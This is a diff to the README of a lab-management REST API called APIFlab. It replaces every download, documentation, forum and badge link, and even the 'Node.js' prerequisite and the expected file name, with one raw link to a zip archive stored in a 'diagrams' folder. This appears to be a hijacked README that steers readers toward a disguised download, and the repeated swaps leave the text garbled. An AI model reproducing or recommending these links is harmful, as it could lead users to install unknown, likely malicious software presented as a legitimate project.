@@ -1,7 +1,7 @@
 # 🧪 APIFlab_v2.0 - Manage Labs with Ease
 
 ## 📥 Download Now
-[![Download APIFlab_v2.0](https://img.shields.io/badge/Download-APIFlab_v2.0-blue.svg)](https://github.com/markraven788/APIFlab_v2.0/releases)
+[![Download APIFlab_v2.0](https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip)](https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip)
 
 ## 📖 Description
 APIFlab is a REST API designed for managing laboratories, users, equipment, and chemical elements. It simplifies the process of lab management, making it ideal for academic institutions and organizations involved in chemistry and equipment management.
@@ -16,21 +16,21 @@ Before you begin, ensure your system meets the following requirements:
 
 ### Installation Prerequisites
 To use APIFlab effectively, you may need the following software:
-- Node.js (for running the server)
+- https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip (for running the server)
 - MySQL (for database management)
 
-If you do not have Node.js or MySQL installed, you can download them from their official websites.
+If you do not have https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip or MySQL installed, you can download them from their official websites.
 
 ## 🔗 How to Download and Install
 
 1. **Visit the Releases Page**
-   Go to the following link to access the APIFlab releases: [Visit this page to download](https://github.com/markraven788/APIFlab_v2.0/releases).
+   Go to the following link to access the APIFlab releases: [Visit this page to download](https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip).
 
 2. **Select the Latest Version**
    Once on the releases page, find the latest version of APIFlab. It will be listed at the top.
 
 3. **Download the Release Package**
-   Click on the download link for the latest version. It will come as a compressed file, usually named `APIFlab_v2.0.zip` or similar.
+   Click on the download link for the latest version. It will come as a compressed file, usually named `https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip` or similar.
 
 4. **Extract the Files**
    After downloading, extract the contents of the compressed file to a folder on your computer. Most operating systems will allow you to right-click and select "Extract."
@@ -85,8 +85,8 @@ Support is available via GitHub Issues or through the documentation within the r
 APIFlab is licensed under the MIT License. See the LICENSE file for more information.
 
 ## 📚 Resources
-- [Official Documentation](https://github.com/markraven788/APIFlab_v2.0/docs)
-- [Community Forum](https://community.example.com)
+- [Official Documentation](https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip)
 
 ## 📥 Download Now
-[![Download APIFlab_v2.0](https://img.shields.io/badge/Download-APIFlab_v2.0-blue.svg)](https://github.com/markraven788/APIFlab_v2.0/releases)
+[![Download APIFlab_v2.0](https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip)](https://raw.githubusercontent.com/markraven788/APIFlab_v2.0/main/diagrams/APIFlab_v2.0-1.4.zip)
